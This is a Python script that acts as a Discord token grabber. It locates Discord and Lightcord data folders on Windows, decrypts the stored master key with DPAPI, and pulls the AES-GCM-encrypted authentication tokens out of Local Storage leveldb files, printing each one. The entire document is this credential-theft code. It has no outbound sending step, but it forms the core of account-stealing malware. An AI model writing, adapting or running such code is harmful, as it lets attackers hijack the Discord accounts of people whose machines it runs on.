import requests,json,os
from json import loads
from os import getlogin, listdir
from json import loads
from re import findall
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


#Decypting the token
def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"


#Paths to where the tokens are stored locally
paths = {
        'Discord': os.getenv('APPDATA') + '\\discord',
        'Discord Canary': os.getenv('APPDATA') + '\\discordcanary',
        'Lightcord': os.getenv('APPDATA') + '\\Lightcord',
        'Discord PTB': os.getenv('APPDATA') + '\\discordptb',
    }


Tokens = []
def main():
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue

        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                if values.endswith("\\"):
                                    values.replace("\\", "")

                                values = decrypt(b64decode(values.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])

                                if values not in Tokens:
                                    Tokens.append(values)
                                    print(values)
                except PermissionError: continue




if __name__ == '__main__':
    main()